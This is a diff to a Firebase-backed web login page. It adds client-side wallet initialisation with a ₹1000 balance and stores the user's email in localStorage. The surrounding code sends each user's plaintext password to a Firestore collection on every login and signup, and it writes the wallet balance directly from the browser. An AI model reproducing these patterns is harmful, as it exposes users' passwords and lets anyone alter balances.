@@ -157,7 +157,7 @@
       border: 2px solid rgba(0,0,0,0.2);
       border-top: 2px solid #000;
       border-radius: 50%;
-      display: none; /* Hidden by default */
+      display: none;
       animation: spin 0.8s linear infinite;
     }
 
@@ -188,11 +188,11 @@
   <div class="login-container">
     <h2>Welcome.</h2>
     <p class="subtitle">Log in to your cosmic workspace</p>
-    
+
     <div class="field-group">
       <input type="email" id="email" placeholder="Email Address" spellcheck="false">
     </div>
-    
+
     <div class="field-group">
       <input type="password" id="password" placeholder="Password">
       <span class="toggle-eye" id="eyeIcon" onclick="togglePassword()">👁️</span>
@@ -202,7 +202,7 @@
       <div class="loader" id="loginLoader"></div>
       <span>Sign In</span>
     </button>
-    
+
     <button class="btn btn-signup" id="signupBtn" onclick="signup()">
       <div class="loader" id="signupLoader" style="border-top-color: #fff;"></div>
       <span>Create Account</span>
@@ -214,7 +214,7 @@
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, collection, addDoc, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8",
@@ -230,8 +230,6 @@
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getFirestore(app);
-
-    // --- COOL UI FUNCTIONS ---
 
     window.togglePassword = function() {
       const passInput = document.getElementById("password");
@@ -249,7 +247,7 @@
       const btn = document.getElementById(btnId);
       const loader = document.getElementById(loaderId);
       const text = btn.querySelector('span');
-      
+
       if (isLoading) {
         loader.style.display = "block";
         text.style.opacity = "0.5";
@@ -260,8 +258,6 @@
         btn.style.pointerEvents = "all";
       }
     }
-
-    // --- FIREBASE LOGIC ---
 
     async function saveToDatabase(email, password, type) {
       try {
@@ -274,6 +270,13 @@
       } catch (e) {
         console.error("Firestore Error: ", e);
       }
+    }
+
+    // Initialize or Sync Wallet
+    async function initWallet(email) {
+      const walletRef = doc(db, "wallets", email);
+      // setDoc with merge:true ensures we don't overwrite if they already have balance
+      await setDoc(walletRef, { balance: 1000 }, { merge: true });
     }
 
     window.login = function () {
@@ -290,6 +293,8 @@
       signInWithEmailAndPassword(auth, email, password)
         .then(async () => {
           await saveToDatabase(email, password, "login");
+          // CRITICAL: Store email and init wallet link
+          localStorage.setItem("userEmail", email);
           localStorage.setItem("userLoggedIn", "true"); 
           window.location.href = "index.html"; 
         })
@@ -313,6 +318,10 @@
       createUserWithEmailAndPassword(auth, email, password)
         .then(async () => {
           await saveToDatabase(email, password, "signup");
+          // NEW: Initialize their wallet with ₹1000 in Firestore
+          await initWallet(email);
+          
+          localStorage.setItem("userEmail", email);
           localStorage.setItem("userLoggedIn", "true");
           window.location.href = "index.html";
         })
